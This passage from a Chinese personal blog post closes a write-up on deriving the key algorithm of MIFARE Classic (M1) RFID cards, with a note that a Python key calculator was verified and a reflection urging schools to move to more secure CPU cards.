title="0x4.结果验证"></a>0x4.结果验证</h3><p>在破解出了Key的算法后，我用Python写了一个计算程序</p><p><img src="https://s2.loli.net/2022/01/19/HSOaPB3QgME98Rk.jpg" alt="一个很水的算法"></p><p>​经过我已有的数据验证，这个计算方法都是成立的，</p><p><img src="https://s2.loli.net/2022/01/19/IOJvc9HzT1UglEx.jpg" alt="成立了"></p><p><img src="https://s2.loli.net/2022/01/19/6oJqKDEGntBVRTO.jpg" alt="又成立了呢"></p><h3 id="0x5-后记"><a href="#0x5-后记" class="headerlink" title="0x5.后记"></a>0x5.后记</h3><p>​像这种M1卡，也是十几年前的发明了。时代日新月异，被破解也是无法避免的事情。只是现在在很多地方，比如校园，都还在大范围使用这种卡，而且溯源性不强。希望能尽快升级成CPU卡，这样安全性就高很多了。</p><p>​破解是一个很有趣的过程，锻炼了我的思维能力，也加深了我对IC卡的了解，还让我懂得了数学的重要性。尽管过程很有趣，得到结果也很能让人获得成就感，但破解过程还是充满着艰辛。光推算秘钥的过程都写满了四张纸。</p><p><img src="https://s2.loli.net/2022/01/19/7EFxRbnTjsSzY8g.jpg" alt="草 稿 纸"></p><p>​最后，当你登上山顶后，收获的风景远比你付出的艰辛多得多。</p>]]></content>
      
      
      
        <tags>
            
            <tag> RFID </tag>
            
            <tag> 浦中 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
